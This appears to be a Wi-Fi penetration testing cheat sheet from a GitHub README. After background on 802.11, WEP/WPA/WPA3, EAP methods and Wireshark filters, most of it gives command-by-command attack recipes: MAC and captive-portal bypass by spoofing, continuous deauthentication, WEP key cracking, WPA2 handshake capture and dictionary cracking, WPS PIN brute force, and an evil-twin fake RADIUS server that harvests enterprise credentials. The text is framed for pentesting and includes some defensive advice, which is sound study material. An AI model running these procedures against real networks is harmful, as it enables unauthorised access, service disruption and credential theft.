<h1 align="center">Tricks - Wi-Fi Penetration Tester</h1>  
<p align="center">
	<img height=400 src="https://github.com/user-attachments/assets/7deab65e-9380-4719-b90f-9474c726ac7f" />
</p>
<h2 align="center"> [x] In construction...</h2>

## Topics
- [802.11](#80211)
- [Wi-Fi standards](#wi-fi-standards)
- [Security Techniques](#security-techniques)
  - [Client Isolation](#client-isolation)
  - [WIDS/WIPS](#widswips)
  - [MAC Filtering](#mac-filtering)
  - [Captive Portal](#captive-portal)
  - [Hiding Wi-Fi Networks](#hiding-wi-fi-networks)
  - [Disabling Responses to Poll Requests](#disabling-responses-to-poll-requests)
- [Authentication](#authentication)
  - [Open Authentication](#open-authentication)
  - [Pre-Shared Key - PSK](#pre-shared-key---psk)
  - [SAE (Simultaneous Authentication of Equals)](#sae-simultaneous-authentication-of-equals)
  - [Enterprise Authentication](#enterprise-authentication)
- [Cryptography](#cryptography)
  - [TKIP (Temporal Key Integrity Protocol)](#tkip-temporal-key-integrity-protocol)
  - [AES-CCMP (Advanced Encryption Standard - Counter Mode with Cipher Block Chaining Message Authentication Code Protocol)](#aes-ccmp-advanced-encryption-standard---counter-mode-with-cipher-block-chaining-message-authentication-code-protocol)
- [Analyse Wireshark](#analyse-wireshark)
  - [WEP](#wep)
  - [WPA](#wpa)
  - [WPA Enterprise](#wpa-enterprise)
  - [Open](#open)
- [Discovery and Basic Commands](#discovery-and-basic-commands)
  - [Passive Discovery](#passive-discovery)
  - [Active Discovery](#passive-discovery)
  - [Basic Commands](#basic-commands)
- [Attacks](#attacks)
  - [Attack Deauthentication](#attack-deauthentication)
  - [WEP OPN Attack with connected clients](#wep-opn-attack-with-connected-clients)
  - [WEP OPN Attack without connected clients](#wep-opn-attack-without-connected-clients)
  - [WEP SKA Attack](#wep-ska-attack)
  - [WEP Dictionary (WEP-SKA or WEP-OPN) Attack](#wep-dictionary-wep-ska-or-wep-opn-attack)
  - [WPA2-Personal Attack](#wpa2-personal-attack)
  - [WPA2-Enterprise Attack](#wpa2-enterprise-attack)
- [General Utilities](#general-utilities)
  - [Wordlists](#wordlists) 
  - [WPA Supplicant - Connect to a Wi-Fi network command line (cli)](#wpa-supplicant---connect-to-a-wi-fi-network-command-line-cli)
  - [hcxdumptool](#hcxdumptool)
---

## 802.11  
The 802.11 standard refers to a series of specifications developed by the IEEE for wireless networks (Wi-Fi), covering different variants such as 802.11b, 802.11a, 802.11g, 802.11n, 802.11ac, 802.11ax, 802.11be, among others. Each variant defines capabilities, frequencies and transmission methods, operating mainly in the 2.4 GHz, 5.8 GHz bands and, more recently, the 6 GHz band. With the continuous development of new versions, the 802.11 standard aims to improve speed, security and efficiency of wireless connections, consolidating itself as the basis of modern Wi-Fi technologies.

## Wi-Fi standards
- 802.11 (Wi-Fi 1; 2.4 GHz; up to 2 Mbps): First standard for wireless networks, introducing low-speed communication in the 2.4 GHz band.
- 802.11b (Wi-Fi 2; 2.4 GHz; up to 11 Mbps): It has improved performance in the 2.4 GHz band, making it popular in basic wireless networking applications.
- 802.11a (Wi-Fi 3; 5.8 GHz; up to 54 Mbps): Introduced operation at 5.8 GHz, offering greater speed but with less range compared to 802.11b.
- 802.11g (Wi-Fi 3; 2.4 GHz; up to 54 Mbps): Combined the speed of 802.11a with the 2.4 GHz band, becoming widely adopted.
- 802.11n (Wi-Fi 4; 2.4 GHz and 5.8 GHz; 150 to 600 Mbps): Introduced MIMO technology, allowing multiple inputs and outputs, significantly increasing speed and range.
- 802.11ac (Wi-Fi 5; 5.8 GHz; up to 3.5 Gbps): Focused on the 5.8 GHz band, it provides high speeds, ideal for streaming and high-demand applications.
- 802.11ax (Wi-Fi 6; 2.4 GHz, 5.8 GHz and 6 GHz; up to 9.6 Gbps): Improves efficiency in congested environments by offering greater capacity and performance across all bands.
- 802.11be (Wi-Fi 7; 2.4 GHz, 5.8 GHz and 6 GHz; up to 46 Gbps): The next generation, promising even higher speeds and better performance in dense environments.

## Wi-Fi Security Protocols
### WEP (Wired Equivalent Privacy)
- WEP was one of the first security protocols for wireless networks, introduced in 1997. It used the RC4 algorithm with 40- or 104-bit keys, but it had significant vulnerabilities, such as static keys and weaknesses that allowed brute force and replay attacks. Due to these flaws, WEP is considered obsolete and not recommended for modern networks. Variants such as WEP OPN and WEP SKA proved to be insufficient in terms of security, contributing to the adoption of more robust protocols such as WPA and WPA2.

### WPA (Wi-Fi Protected Access) – WPA1
- WPA was created to improve the security of wireless networks compared to WEP, using TKIP (Temporal Key Integrity Protocol) for encryption and introducing dynamic key rotation. It offers a more robust authentication process, allowing methods such as PSK and 802.1X. Although it represented a significant advance, WPA still uses the RC4 algorithm, which is considered insecure, and was eventually surpassed by stronger protocols such as WPA2.

### WPA (Wi-Fi Protected Access) - WPA2
- WPA2 is an evolution of WPA, using the AES-CCMP protocol for encryption, ensuring high security and data integrity. It allows authentication via PSK (Pre-Shared Key) or 802.1X, offering flexibility and robust protection against attacks, especially compared to WEP. Using AES significantly improves security, making WPA2 the preferred choice for modern wireless networks.

### WPA (Wi-Fi Protected Access) - WPA3
- WPA3 continues to use AES-CCMP as its primary encryption protocol, maintaining the security of WPA2 but introducing significant improvements. It uses the Simultaneous Authentication of Equals (SAE) method for authentication in personal environments, providing greater resistance to brute force and dictionary attacks. For business environments, WPA3-Enterprise uses EAP (Extensible Authentication Protocol), allowing for more robust and secure authentication methods, such as digital certificates. WPA3 also implements once-per-session encryption, further improving communication security.

## Security Techniques
### 802.11W Protected Management Frames (PMF)
802.11W, also known as Protected Management Frames (PMF), is an extension of the Wi-Fi standard designed to secure management frames, such as authentication and deauthentication messages, against attacks like "deauth" (deauthentication). With PMF enabled, it becomes more challenging for an attacker to disconnect devices from the network through deauthentication attacks, adding an extra layer of security, especially for public networks. However, for PMF to be effective, both the access point and connected devices must support and be configured to use it.

*WPA3 has PMF (Protected Management Frames) enabled by default

*Older devices may not support WPA3, considering that it was introduced in 2018. So a good option that routers provide is to put WPA3 in compatibility mode with WPA2, this way newer devices will prefer to use WPA3, while older devices will still be able to use the Wi-Fi network, through WPA2.

### Client Isolation
Client isolation is a setting on the access point that prevents devices on the same network from communicating directly with each other. This technique is particularly useful on public networks as it limits the attack surface, making it harder for one device to compromise another on the same network. However, while it enhances security, client isolation alone cannot protect against targeted attacks that may use the router as an intermediary.

### WIDS/WIPS
WIDS (Wireless Intrusion Detection System) and WIPS (Wireless Intrusion Prevention System) are security solutions for wireless networks. WIDS continuously monitors a network for suspicious activity such as intrusions, unauthorized access attempts, and the presence of fake access points (fake APs), analyzing traffic to generate alerts about anomalous behavior. WIPS, in addition to detecting these threats, automatically takes preventive actions.

-> Changing the mac address several times during attacks can help avoid being blocked on the Wi-Fi network  

### MAC Filtering
- MAC address filtering allows you to create a whitelist of devices authorized to connect to a Wi-Fi network, as well as a blacklist of devices that are blocked. Although this technique adds a layer of security, it is vulnerable to attacks as MAC addresses can be easily spoofed.

#### MAC Filter Bypass
-> add the lines below to the /etc/NetworkManager/NetworkManager.conf file to preserve the mac address cloned on top of the ethernet and wifi interface
```bash
[device]
wifi.scan-rand-mac-address=no

[connection]
ethernet.cloned-mac-address=preserve
wifi.cloned-mac-address=preserve
```

-> Restart NetworkManager
```bash
sudo systemctl restart NetworkManager
```

-> Turn off WiFi
```bash
nmcli r wifi off
```

-> Turn on WiFi
```bash
nmcli r wifi on
```

-> Enable monitoring mode with airmon-ng
```bash
airmon-ng start wlan0
```

-> Get the SSID, BSSID and channel
```bash
airodump-ng wlan0
```

-> Monitor clients connected to the chosen Wi-Fi network
```bash
airodump-ng wlan0 --essid <essid> --bssid <bssid> --channel 6
```

-> Turn off interface
```bash
ifconfig wlan0 down
```

-> Activate the interface
```bash
ifconfig wlan0 up
```

-> Clone the MAC Address of one of the devices connected to the Wi-Fi network
```bash
ifconfig wlan0 down
macchanger -m <mac_address>
ifconfig wlan0 up
```

#### Others
-> Change MAC address randomly
```bash
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
```

-> Return to original MAC address
```bash
ifconfig wlan0 down
macchanger -p wlan0
ifconfig wlan0 up
```

### Captive Portal
A captive portal is a web-based login page that users see when they attempt to connect to a Wi-Fi network. A captive portal requires the user to provide credentials (such as a login or acceptance of terms) before granting access to the Internet, and is most commonly used as an additional security control on open networks (without network-level authentication), where authentication occurs via the portal rather than a pre-shared key (PSK).

#### Captive Portal Bypass
Muitas implementações de portais cativos dependem do endereço MAC do cliente para verificar se o usuário já foi autenticado e redirecionar para o portal. No entanto, esse método pode ser ignorado por um invasor, pois os endereços MAC podem ser facilmente falsificados.  

-> Monitor Wi-Fi networks and get the essid and channel of a specific network
```bash
airodump-ng wlan0
```

-> See which stations are associated on the Wi-Fi network
```bash
airodump-ng wlan0 --essid <ssid> --channel <channel>
```

-> Change your MAC address to the MAC address of an already associated client
```bash
ifconfig wlan0 down
macchanger -m <MAC_station> wlan0
ifconfig wlan0 up
```

### Hiding Wi-Fi Networks
- Access points (APs) can hide the network name (SSID) in their broadcasts, making it harder for unauthorized users to detect them. However, this approach is not foolproof, as attackers can use techniques to find hidden networks.  
-> Hidden networks appear by airodump-ng monitoring, but without the SSID  
-> In the case of hidden networks, simply monitor the access points, and when a device connects to a hidden Wi-Fi network, the SSID of the hidden Wi-Fi network will be revealed by airodump

### Disabling Responses to Poll Requests
- APs can be configured to ignore probe requests sent via broadcast. Although this can reduce network visibility, it can also be bypassed by attackers using specific tools.

*** These last three techniques (MAC Filtering, Hiding Wi-Fi Networks, Disabling Responses to Poll Requests) despite being used to increase security, can be bypassed relatively easily by attackers. ***

## Authentication
### Open Authentication
Open Authentication does not use any form of encryption. In this model, any device can connect to the network without needing to provide credentials or authentication, meaning data traffic is transmitted in clear text. This makes open networks extremely vulnerable to interception and attacks, as data can be easily read by anyone within signal range. For this reason, it is highly recommended to avoid using open networks in environments that require security.

### Pre-Shared Key - PSK
In pre-shared key authentication, a common key is defined between the access point and the clients. This approach is simple to implement, but may be less secure in environments where the key may be shared or exposed. WPA1-Personal and WPA2-Personal allows the use of PSK, while WPA3-Personal uses Simultaneous Authentication of Equals (SAE) as an enhanced authentication method. 

### SAE (Simultaneous Authentication of Equals)
Simultaneous Authentication of Equals (SAE), introduced in WPA3-Personal, uses Dragonfly Key Exchange to provide mutual authentication through a cryptographic process in which both parties prove possession of the same key without transmitting it. During the handshake process, a unique key is generated for each authentication, unlike PSK (Pre-Shared Key), which uses the same Pairwise Master Key for all connections. In this way, SAE strengthens security against offline password cracking attacks after the handshake has been captured.

### Enterprise Authentication
Enterprise authentication uses the IEEE 802.1X protocol, which provides an additional layer of security. In this model, the access point (AP) forwards authentication traffic between the client and a RADIUS server. The 802.1X standard makes use of the Extensible Authentication Protocol (EAP), allowing for multiple authentication methods, such as digital certificates or credentials. EAP offers versatility and supports certificate-based authentication, increasing security compared to password-only methods. In addition, it allows for centralized authentication managed by RADIUS servers, facilitating robust control and auditing for enterprise environments.

-> EAP (Extensible Authentication Protocol) as a fundamental component of Enterprise authentication, EAP offers flexibility in choosing and implementing appropriate security protocols for corporate networks.

#### EAP-TLS (Extensible Authentication Protocol - Transport Layer Security)
- EAP-TLS is one of the most secure authentication methods, using digital certificates for both the client and the server. This authentication process ensures that both parties verify their identities before establishing a connection. Although it offers high security and does not require a username and password, only certificates, EAP-TLS requires a certificate management infrastructure, which can increase implementation complexity, making it more suitable for corporate environments that can support this infrastructure.

#### EAP-TTLS (Extensible Authentication Protocol - Tunneled Transport Layer Security)
- EAP-TTLS creates a secure tunnel in which the server presents a digital certificate to ensure authenticity, while the client can authenticate itself using simple methods such as username and password. Its main advantage is its flexibility, as it supports different authentication methods within the tunnel, such as PAP, CHAP, MS-CHAPv2, and even other protocols such as EAP-TLS. This makes it highly adaptable to different scenarios. In short, EAP-TTLS functions as an “authentication framework” that protects the exchange of sensitive information through the encrypted tunnel, while using other authentication methods to validate the client’s identity.

#### PEAP (Protected Extensible Authentication Protocol)
- PEAP also uses a secure tunnel initiated by the server's digital certificate, but encapsulates a single authentication method, typically MS-CHAPv2 or EAP-MSCHAPv2, within the tunnel. As with EAP-TTLS, clients authenticate with a username and password. However, PEAP is more restrictive in that it limits authentication methods to a single protocol, making it simpler to implement but less flexible than EAP-TTLS.

#### EAP-FAST (Extensible Authentication Protocol - Flexible Authentication via Secure Tunneling)
- EAP-FAST was developed by Cisco as an alternative that does not require digital certificates. Instead, it uses a method called "Protected Access Credential" (PAC), which is shared between the client and server. EAP-FAST creates a secure tunnel for authentication, simplifying the process. However, EAP-FAST security depends on proper PAC management, if a PAC is compromised, an attacker can gain access to the network. Additionally, EAP-FAST does not provide mutual authentication, which can make it vulnerable to man-in-the-middle attacks if the server is not properly authenticated.

#### EAP Methods to Avoid
- EAP methods that do not include mutual authentication, such as EAP-MD5, EAP-GTC and EAP-LEAP, have serious security flaws and should be avoided in critical environments. Although EAP-FAST offers a more practical alternative without the need for digital certificates, it also has vulnerabilities such as the lack of mutual authentication and the dependence on proper PAC management. Therefore, EAP-FAST should be used with caution and, when possible, preferred more robust methods, such as EAP-TLS, EAP-TTLS and PEAP, which offer adequate protection and are widely accepted in corporate environments.
  
#### PAP (Password Authentication Protocol):
- PAP is one of the simplest authentication methods, using a username and password sent in clear text. As it is easily vulnerable to interception and attacks, PAP is not recommended for environments that require high security.

#### CHAP (Challenge Handshake Authentication Protocol):
- CHAP improves security over PAP by utilizing a challenge and response process. The server sends a challenge to the client, which must respond with a response generated from its password and the challenge. This avoids sending the password in clear text, making CHAP more secure than PAP. However, it is still susceptible to some types of attacks, such as replay attacks.
  
#### MS-CHAPv2 (Microsoft Challenge Handshake Authentication Protocol version 2):
- MS-CHAPv2 is an enhanced version of CHAP, developed by Microsoft. Like CHAP, it uses a challenge and response method, but offers improvements such as the ability for mutual authentication, where both the client and server verify their identities. MS-CHAPv2 is widely used in VPN connections and corporate networks, especially in configurations that support WPA2-Enterprise and WPA3-Enterprise, where it can be implemented as part of EAP-MSCHAPv2. This allows authentication to occur within a secure tunnel, increasing protection against attacks.

## Cryptography
### TKIP (Temporal Key Integrity Protocol)
- TKIP (Temporal Key Integrity Protocol) was developed to correct WEP vulnerabilities, which used the RC4 algorithm and presented serious security flaws. Implemented in WPA (WPA1), TKIP introduced dynamic key rotation, improving security in wireless networks. However, TKIP still used RC4 and, like WEP, is no longer considered secure. Currently, more robust protocols such as WPA2 and WPA3, using AES, are recommended to ensure adequate protection in wireless networks.

### AES-CCMP (Advanced Encryption Standard - Counter Mode with Cipher Block Chaining Message Authentication Code Protocol)
- AES-CCMP is an encryption protocol used in WPA2 and WPA3, based on AES with a 128-bit key. It uses CTR (Counter) mode for data encryption and CBC-MAC to ensure integrity and authenticity. After authentication (via SAE, PSK or EAP), data encryption is performed with AES-CCMP. Compared to TKIP, which uses the vulnerable RC4, AES-CCMP is more secure, as RC4 is susceptible to attacks such as key-recovery and biases, compromising data confidentiality. AES offers greater robustness and resistance to modern attacks.

## Analyse Wireshark
### WEP
```
wlan.fc.type_subtype == 0x0008 && wlan.fixed.capabilities.privacy == 1 && !wlan.tag.number == 48 && !wlan.wfa.ie.type == 0x01
```
wlan.fc.type_subtype == 0x0008: Filtra apenas pacotes de beacon.  
wlan.fixed.capabilities.privacy == 1: Seleciona conexões criptografadas (WEP ou WPA).  
!wlan.tag.number == 48: Remove pacotes com tags RSN.  
!wlan.wfa.ie.type == 0x01: Remove pacotes WAP específicos do fornecedor.  

To identify the type of authentication on a WEP network, follow the steps below:  
-> Filter Management Packs, using the following filter in wireshark
```
wlan.fc.type == 0
```
-> Search for Authentication packages in the filtered list.  
-> Click on a package and expand the IEEE 802.11 Wireless Management section.  
-> Check the Authentication Algorithm, within this section, access Fixed Parameters and locate Authentication Algorithm.  
-> If the indicated algorithm is Shared Key, authentication is WEP-SKA. Otherwise, if there is no challenge, it is WEP-OPN  

### WPA
-> Analyze IEEE 80.11 Wireless Management  
-> Tagged parameters  
-> Tag: RSN Starting information to discover the authentication method and encryption algorithms used in the WPA/WPA2/WPA3 Wi-Fi network  
-> Similar to the previous one, but includes packages with RSN or WAP tags from the supplier.
```bash
wlan.fc.type_subtype == 0x0008 && wlan.fixed.capabilities.privacy == 1 && ((wlan.tag.number == 48) || (wlan.wfa.ie.type == 0x01))
```

### WPA Enterprise
-> eapol: Captures all EAPOL packets, which are used during authentication on WPA/WPA2 Enterprise networks.  
-> (wlan.fc.type_subtype == 0x0008 && wlan.tag.number == 221 && wlan.rsn.akms.type == 0x01):  
-  Filter Beacon Packets (type_subtype == 0x0008).  
-  Checks if the network is using WPA/WPA2 (RSN tag, tag.number == 221).  
- Identifies that the key management is of type EAP (rsn.akms.type == 0x01).  
```bash
(eapol || (wlan.fc.type_subtype == 0x0008 && wlan.tag.number == 221 && wlan.rsn.akms.type == 0x01))
```

### Open
-> Filter only bacon packages without authentication and without encryption  
```bash
wlan.fc.type_subtype == 0x0008 && wlan.fixed.capabilities.privacy == 0
```

## Discovery and Basic Commands
### Passive Discovery
In passive discovery, no probe requests are sent. Instead, the communication channel is monitored, collecting information such as SSID and BSSID from beacons that are broadcast by APs (signals periodically sent by access points to connected devices, announcing their presence and network information). This method allows you to identify Wi-Fi networks without directly interacting with them, which is useful for avoiding detection during testing.  

An example command for passive discovery:
```bash
airodump-ng wlan0
```
- In this case, the command puts the wlan0 interface into monitoring mode and starts passively listening for beacon packets broadcast by surrounding access points (APs) without sending probe requests. It displays information such as the SSID, BSSID, security type, and signal strength of the networks it finds without actively interacting with them.

### Active Discovery
-> Active discovery: It involves sending probe requests to Wi-Fi networks to identify access points (APs). Testing tools broadcast these requests and record the responses from APs, collecting information about SSID, BSSID, security type, and other relevant data to map available networks.  

An example command for active discovery:
```
iwlist wlan0 scanning
```
- This command performs active reconnaissance by sending probe requests (active scanning) to access points, prompting them to respond with information such as SSID, BSSID, security type, and signal strength. By actively querying APs, it makes your device more visible and detectable by the networks you are scanning.

*** Active reconnaissance can be useful when specific network information needs to be obtained, such as in cases where SSIDs are hidden, or when many access points need to be detected quickly. It is also useful for obtaining complete responses from APs that do not transmit all of their beacon information, and is effective in dynamic environments with multiple APs that may change their configurations frequently. However, it is more visible and detectable, which should be considered depending on the scenario. ***

### Basic Commands
- iwconfig (Used to configure and adjust wireless network parameters, such as modifying the SSID, BSSID and interface operating mode)  
- iwlist (list available wireless networks, their SSIDs, BSSIDs, signal levels and other relevant details)  
- ifconfig (Used to view and configure network interfaces, including assigning IP addresses, enabling/disabling network interfaces, etc.)  

-> Scan networks, bringing all SSIDs, channel and BSSIDs (managed mode)
```bash
iwlist wlan0 scanning
iwlist wlan0 scanning | egrep "ESSID|Channel:|Address:"
```

-> Disable interface
```bash
ifconfig wlan0 down
```

-> Activate interface
```bash
ifconfig wlan0 up
```

-> You can use ifconfig to check if wlan0 was deactivated and reactivated during the process

-> Change the interface operating channel
```bash
ifconfig wlan0 down
iwconfig wlan0 channel 6
ifconfig wlan0 up
```

-> Show the operating channel of an interface
```bash
iwlist wlan0 channel
```

-> Switch from managed mode to monitor
```bash
ifconfig wlan0 down
iwconfig wlan0 mode Monitor
ifconfig wlan0 up
```
or

-> Enable monitor mode with airmon-ng
```bash
airmon-ng start wlan0
```

-> Check the current interface mode
```bash
iwconfig wlan0
```

-> Monitor the Wi-Fi network (BSSID's of access points, signal strength, number of beacons and data transmitted, channels, type of ciphers used, ESSID's, mac address of devices connected to Wi-Fi networks.
```bash
airodump-ng wlan0
```

-> Close all processes that may be preventing the board from entering monitoring mode
```bash
airmon-ng check kill
```

## Attacks
-> Wi-Fi Personal  
On personal networks, WEP attacks are effective due to several vulnerabilities in the protocol. Static keys make the network susceptible to replay attacks, where captured packets can be reused. Additionally, the use of 24-bit initialization vectors (IV) limits the possible combinations, allowing attackers to analyze patterns and break encryption. On networks with significant traffic, it is possible to collect enough packets to perform statistical analysis.

On the other hand, WPA networks, although more secure, also have vulnerabilities. Attacks usually involve capturing the authentication handshake, followed by brute-force or dictionary attacks. The effectiveness of these attacks depends on the strength of the passwords used; weak passwords can be easily compromised. So, although WPA offers a significant improvement over WEP, security in personal networks still depends on the implementation of strong passwords and good security practices. The WPA3-Personal protocol, which uses Simultaneous Authentication of Equals (SAE), offers a significant improvement in security, especially against dictionary and brute-force attacks. By capturing the authentication handshake, these attacks become much more difficult, as SAE protects against attempts to reuse passwords. In addition, WPA3 also implements Message Integrity Protection (PMF), which adds an additional layer of security against packet spoofing and traffic manipulation attacks.

-> Wi-Fi Enterprise  
In enterprise networks using 802.1X, WPA2-Enterprise, and WPA3-Enterprise, for an attacker to gain access to the tunnel and perform an attack, the attacker must be positioned between the client and the access point (AP) to which the client is attempting to connect. Clients are often misconfigured and do not validate the identity of the RADIUS server. This allows the attacker to provide a false authentication service, tricking the client into connecting to the attacker's network. This vulnerability highlights the importance of proper configuration and certificate validation to ensure secure connections in enterprise environments.

### Attack Deauthentication
The WPA1 and WPA2 protocols have a vulnerability related to denial of service (DoS) attacks due to the lack of robust authentication in control packets, such as deauthentication packets. This vulnerability allows an attacker to send spoofed deauthentication packets to disconnect clients from the network. The attack can be carried out without the attacker being connected to the network, simply by sending deauthentication packets to a client or group of clients. In contrast, WPA3, with Protected Management Frames (PMF), offers significant mitigation of this vulnerability, ensuring protection against deauthentication attacks.

-> Enable monitoring mode with airmon-ng
```bash
airmon-ng start wlan0
```

-> Obtain ESSID and target channel by passively monitoring Wi-Fi networks
```bash
airodump-ng wlan0
```

-> Monitor clients connected to the chosen Wi-Fi network
```bash
airodump-ng wlan0 --channel 6 --essid <ssid>
```

-> Use aireplay to perform deauth attack on all clients, the value 0 passed to parameter 0 will perform deauth repeatedly without stopping
```bash
aireplay-ng wlan0 -0 0 -a <bssid>
```

### WEP OPN Attack with connected clients 
-> Obtain ESSID and target channel by passively monitoring Wi-Fi networks
```bash
airodump-ng wlan0
```

-> Monitor clients connected to a specific Wi-Fi network and capture packets to a file for later analysis
```bash
airodump-ng --essid <ssid> --channel <channel> wlan0 -w wep
```

-> Replay packets within the Wi-Fi network to obtain several initialization vectors that will facilitate breaking the key (wait until a good amount of packages, example: 80 thousand packages on #Data)
```bash
aireplay-ng -3 -b <bssid> -h <client_mac> <interface>
```

-> Cracking to discover the key
```bash
aircrack-ng -a 1 wep-01.cap 
```

#### Other
-> Decrypt a packet file using a WEP key in hexadecimal
```bash
airdecap-ng -w wep-01.cap 
```

### WEP OPN Attack without connected clients
-> Obtain ESSID and target channel by passively monitoring Wi-Fi networks
```bash
airodump-ng wlan0
```

-> Monitor clients connected to the chosen Wi-Fi network
```bash
airodump-ng wlan0 --bssid <bssid> --channel <channel> -w wep
```

-> Create a fake client to carry out the attack through this fake authentication
```bash
aireplay-ng -1 60000000 -a <bssid> wlan0 -e <ssid>
```

-> Explore fragmentation or ChopChop to capture packets (dump plaintext in .cap and keystream in .xor)
```bash
aireplay-ng -4 -a <bssid> -h <fake_client_mac> wlan0
```

-> Forge ARP packet to send to the fake client, increasing the IV's and thus being able to break it
```bash
packet-forge-ng -0 -a <bssid> -k <source_IP> -l <destination_IP> -h <fake_client_mac> -y <xor_file> -w arp_request
```

-> Send forged ARP packet repeatedly to the fake authentication client (expect up to 15/20 thousand packets in #Data)
```bash
aireplay-ng -2 -r arp_request wlan0
```

-> Cracking to discover the key
```bash
aircrack-ng -a 1 wep-02.cap 
```

### WEP SKA Attack
-> Enable monitor mode with airmon-ng
```bash
airmon-ng start wlan0
```

-> Obtain ESSID and target channel by passively monitoring Wi-Fi networks
```bash
airodump-ng wlan0
```

-> Monitor clients connected to the chosen Wi-Fi network
```
airodump-ng wlan0 --essid <ssid> --bssid <bssid> --channel <channel> -w wepska
```

-> Deauth a client connected to the Wi-Fi network and when it authenticates again, capture the keystream (xor file)
```bash
aireplay-ng -o 3 -a <bssid> -c <station_mac> wlan
```

-> Perform fake authentication with captured keystream
```bash
aireplay-ng -1 0 -a <bssid> -y <xor_file> wlan0
```

-> Send ARP replay packets increasing packets and collecting more IV's, in order to facilitate breaking later (wait until a good amount of packets, example: 50 thousand packets in #Data)
```bash
aireplay-ng -3 -b <bssid> -h <fake_client_mac> wlan0
```

-> Cracking to discover the key
```bash
aircrack-ng -a 1 wepska-01.cap
```

#### Other
-> If you want to decrypt a packet file with the discovered key, convert the WEP key to hexadecimal format
```bash
echo -n "<password>" | xxd -p
```

-> Use airdecap to crack the password based on your WEP key in hexadecimal
```bash
airdecap-ng -w "<hex_key>" wepska-01.cap
```

### WEP Dictionary (WEP-SKA or WEP-OPN) Attack
-> Monitor Wi-Fi networks, get the SSID and channel
```bash
airodump-ng wlan0
```

-> Monitor and capture packets that have the IV's of clients connected to the chosen Wi-Fi network
```bash
airodump-ng wlan0 --essid <ssid> --channel <channel> -w wepbrute
```

-> Cracking the 128-bit key with wordlist
```bash
aircrack-ng -a 1 -n 128 -w /usr/share/wordlists/rockyou.txt wepbrute-01.cap
```

### WPA2-Personal Attack
-> Monitor Wi-Fi networks, get the SSID and channel of the chosen network
```bash
airodump-ng wlan0
```

-> Monitor clients connected to the chosen Wi-Fi network
```bash
airodump-ng wlan0 --essid <essid> --channel 6 -w wpa
```

-> Capture the handshake by forcing a client to connect to the access point again, for this it is necessary to send deauth packets to disassociate all clients via broadcast or for a specific client and it will connect automatically
```bash
aireplay-ng wlan0 -0 10 -a <bssid>
```

-> Wi-Fi password crack
```bash
aircrack-ng -a 2 -b <bssid> -w wordlist.txt wpa-01.cap
```

#### Other
-> If you want to decrypt a package file using a WPA password, use airdecap
```bash
airdecap-ng -p <password> example.cap -e <ssid>
```

#### WPS Attack
WPS (Wi-Fi Protected Setup) is a simplified Wi-Fi network configuration method designed to make it easier for devices to connect to the network without having to type in a long password. It uses an 8-digit PIN or a physical button to authenticate and transmit the Wi-Fi network name and password.

Some routers support WPS for a short period of time after activation, and then automatically disable it after the period ends. However, the 8-digit PIN has significant vulnerabilities, as the combination can be cracked by relatively quick brute-force attacks. While WPS was designed to make setup easier, exploiting these weaknesses makes the protocol vulnerable, and it has already been discontinued in many devices due to these security flaws.

-> Identify access points on the network that have WPS active
```bash
airodump-ng wlan0 --wps
```

-> Check if any blocking of the WPS mechanism has occurred, if so, you need to restart the access point to return the attack
```bash
wash -i wlan0
```

-> Perform brute force to break the key
```bash
reaver -i wlan0 -b <bssid> -vv --no-nacks -c <channel>
```
-> New equipment has a physical lock, press a WPS button and it will only be active for 2 minutes.

### WPA2-Enterprise Attack
*you can use one or two network cards to increase attack performance on Enterprise Wi-Fi networks

RADIUS is a remote authentication server widely used in Wi-Fi Enterprise networks, where it is essential to ensure secure and managed access control. It can be configured for both authentication and accounting. The main difference between a RADIUS authentication server and an accounting server is in their functions: the authentication server checks the credentials of users trying to access the network, allowing or denying access based on validation (such as username and password) . In contrast, the accounting server records and monitors network usage by authenticated users, collecting data on login times, usage time, and volume of data transferred. Both are essential for managing security and resources on a network, ensuring controlled access and analysis of usage.

In Network Policy Server (NPS), which can be configured on Windows Server, you can define policies to manage authentication, authorization, and accounting on RADIUS networks. This includes configuring authentication methods, connection conditions, and actions to take (such as allowing or denying access). Additionally, you can restrict access to wireless connections only for users who belong to a specific Active Directory group. This configuration allows for centralized and secure control of network access, ensuring that only authorized users can connect.

client -> access point -> radius  
radius -> access point -> client  

To perform the attack it is necessary to interrupt the client's communication with the target Wi-Fi network, deauthenticating it and forcing it to connect to our fake SSID with a fake radius server behind it to capture the username, challenge and EAP response and try to discover the password through cracking.

-> Monitor Wi-Fi network
```bash
airodump-ng wlan0 --essid <essid> -w wpa-en --output-form netxml --write-interval 5
```

-> Install hostapd-wpe
```bash
apt-get install hostapd-wpe
```

-> Change the interface, SSID (same SSID as the network you want to clone), channel (if you are going to use just one card, it is recommended to put the same channel for the server that will be uploaded with hostpad, monitoring with airodump and deauthentication with aireplay-ng)

```bash
vim /etc/hostapd-wpe/hostapd-wpe.conf
```

-> Create a fake access point with a fake radius server to receive authentication from a client and capture the username, challenge and EAP response
```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

-> Use aireplay to perform the deauth attack on all clients on the Wi-Fi network, the value 0 passed to parameter 0 will perform deauth repeatedly without stopping
```bash
aireplay-ng -0 0 -a <bssid> wlan0
```
-> Client will connect to our fake hostapd access point and we will obtain the username, challenge and EAP response from hostapd, stop the attack then

-> hostpad saves usernames, challenges and responses in a log file called hostapd-wpe.log

-> This captured user is a valid user on the network, and can be used in the post-exploitation stage

-> Perform brute force attack with asleap or hashcat with GPU mode

-> Install asleap
```bash
apt-get install asleap
```

-> With the challenge, response and a wordlist perform the brute force attack
```bash
asleap -R <challenge> -R <response> -W wordlist.txt
```

To optimize security on corporate Wi-Fi networks, it is recommended to give preference to authentication with EAP-TLS. There are differences between PEAP and EAP-TLS. PEAP uses user and password authentication on the client and a certificate on the server, offering basic security, but still transmitting credentials, which makes it more susceptible to attacks such as evil twin and data interception. EAP-TLS adopts an approach based on the mutual exchange of certificates, eliminating the need to transmit user credentials.

To implement EAP-TLS effectively, it is recommended that you configure policies on the Network Policy Server (NPS) to authorize RADIUS access exclusively to devices authenticated in the corporate Wi-Fi group. In the Certification Authority (Local) Root Console, it is essential to create and manage suitable certificates, including a certificate template for RAS and IAS Server, allowing "Authenticated Users" to have "enroll" and "autoenroll" permissions. By automatically linking these certificates to a specific organizational unit (OU) or domain, domain-joined devices receive the certificates automatically and securely. As a result, EAP-TLS strengthens network security, minimizes the risk of attacks involving fake APs and improves certificate management in corporate networks.

#### asleap issues
-> In newer versions of kali linux with the asleap 2.3 version, you may encounter some problems, to resolve them use the asleap2.2 version
```bash
wget https://security.debian.org/debian-security/pool/updates/main/o/openssl1.0/libssl1.0.2_1.0.2u-1~deb9u7_amd64.deb
